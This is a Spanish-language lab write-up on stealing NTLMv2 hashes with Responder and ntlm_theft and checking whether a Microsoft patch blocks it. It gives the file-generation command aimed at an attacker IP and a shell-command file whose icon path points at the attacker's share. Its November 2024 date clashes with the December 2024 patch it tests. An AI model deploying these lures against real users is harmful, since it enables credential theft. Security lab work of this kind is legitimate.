---
title: NTLMv2 Hashes Steal
author: 1
date: 2024-11-03
categories: [Cybersecurity, NTLM]
tags: [Hashes, Responder, Windows]
image: /assets/img/tareas/NTLM.jpg
---

Demostrar de manera práctica el funcionamiento del robo de hashes NTLMv2, mediante el uso de archivos modificados. Además, evaluaremos la efectividad del parche de seguridad lanzado por Microsoft en diciembre de 2024 para mitigar esta vulnerabilidad.

![Figura 1](/assets/img/tareas/NTLMv2/NTLM.jpg)

## Herramientas Utilizadas

- **Responder**: Permite interceptar y manipular solicitudes de autenticación en redes Windows.
- **ntlm_theft**: Genera archivos modificados que envían credenciales NTLM al atacante.

Uso básico:
```bash
python3 ntlm_theft.py -g modern -s 192.168.1.11 -f Important
```

![Figura 2](/assets/img/tareas/NTLMv2/1.png)

## Archivos Generados

```bash
❯ ls
Important-(externalcell).xlsx  Important-(icon).url
Important-(stylesheet).xml     Important.asx
Important.lnk                  Important.rtf
Important-(frameset).docx      Important-(includepicture).docx
Important-(url).url            Important.htm
Important.m3u                  Important.wax
Important-(fulldocx).xml       Important-(remotetemplate).docx
Important.application          Important.jnlp
Important.pdf
```

## Configuración del Entorno

Compartimos el archivo Excel con la máquina víctima y ejecutamos **Responder** en la máquina atacante.

![Figura 3](/assets/img/tareas/NTLMv2/2.png)

![Figura 4](/assets/img/tareas/NTLMv2/3.png)

![Figura 5](/assets/img/tareas/NTLMv2/4.png)

## Aplicación del Parche

Se aplicó el parche lanzado por Microsoft en diciembre de 2024 para Windows 10.

![Figura 6](/assets/img/tareas/NTLMv2/5.png)

Al probar nuevamente, la vulnerabilidad persiste al abrir el archivo Excel.

![Figura 7](/assets/img/tareas/NTLMv2/6.png)

## Windows Server 2016

En Windows Server 2016 probamos un archivo que no requiere ser abierto para explotar la vulnerabilidad.

```ini
[Shell]
Command=2
IconFile=\\192.168.1.11\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```

![Figura 8](/assets/img/tareas/NTLMv2/7.png)

Simplemente al acceder a la ruta del archivo, se capturan los hashes correspondientes.

![Figura 9](/assets/img/tareas/NTLMv2/8.png)

![Figura 10](/assets/img/tareas/NTLMv2/9.png)

## Instalación del Parche

Al intentar instalar manualmente el parche, se detecta que no es aplicable a Windows Server 2016.

![Figura 11](/assets/img/tareas/NTLMv2/10.png)

![Figura 12](/assets/img/tareas/NTLMv2/11.png)

## Conclusión del Laboratorio

Este laboratorio demostró que:

1. En **Windows 10**, incluso tras aplicar el parche, se pueden capturar hashes NTLM abriendo archivos modificados.
2. En **Windows Server 2016**, la vulnerabilidad persiste sin necesidad de abrir el archivo, y los parches de seguridad no son aplicables.

Esto resalta la importancia de evaluar constantemente las mitigaciones en entornos vulnerables.

![Figura 13](/assets/img/tareas/NTLMv2/12.png)

![Figura 14](/assets/img/tareas/NTLMv2/13.png)

![Figura 15](/assets/img/tareas/NTLMv2/14.png)

